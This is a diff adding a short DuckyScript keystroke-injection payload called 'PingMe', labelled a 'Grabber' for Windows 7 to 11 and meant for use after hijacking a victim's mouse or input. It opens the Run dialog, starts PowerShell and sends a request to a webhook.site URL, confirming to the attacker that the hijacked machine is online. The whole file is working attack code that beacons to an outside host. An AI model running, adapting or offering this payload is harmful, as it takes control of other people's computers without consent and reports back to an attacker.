@@ -1,0 +1,13 @@
+REM Title: PingMe
+REM Author: 7h30th3r0n3
+REM Target:  Windows 7/8/10/11 
+REM Version: 1
+REM Category: Grabber
+REM Designed to be used for mouse hijacking to find out if it is connected to the internet
+GUI r
+DELAY 400
+STRING powershell
+ENTER
+DELAY 400
+STRING Invoke-WebRequest -Uri https://webhook.site/<TOKEN> -Method GET;exit
+ENTER
